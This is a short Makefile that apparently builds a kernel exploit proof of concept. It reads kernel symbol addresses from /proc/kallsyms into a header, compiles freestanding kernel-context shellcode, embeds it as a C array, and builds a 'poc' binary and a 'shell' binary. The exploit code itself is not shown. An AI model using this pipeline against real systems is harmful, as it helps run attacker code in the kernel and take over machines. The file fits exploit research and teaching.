SYMLIST = module_alloc|schedule_on_each_cpu|user_path_at_empty|path_put|printk

KERNEL_CFLAGS = \
	-static -nostartfiles -nodefaultlibs -nostdlib \
	-mno-80387 -mno-fp-ret-in-387 -mno-mmx -mno-sse -mno-sse2 -mno-3dnow -mno-avx \
	-mpreferred-stack-boundary=4 -mno-red-zone \
	-fomit-frame-pointer -fno-stack-protector

.PHONY: all
all: poc.c ../shell/shell.c
	sudo grep -w -E '($(SYMLIST))' /proc/kallsyms | awk '{printf("#define X_%s 0x%s\n", $$3, $$1)}' >poc.h
	echo "#define SHELL \"$(CURDIR)/shell\"" >>poc.h
	gcc ../shell/shell.c -o shell
	gcc $(KERNEL_CFLAGS) shellcode.c -o shellcode
	objcopy --dump-section .text=/dev/stdout shellcode | xxd -i >shellcode.inc
	gcc poc.c -o poc

.PHONY: clean
clean:
	rm -f shell shellcode shellcode.inc poc poc.h
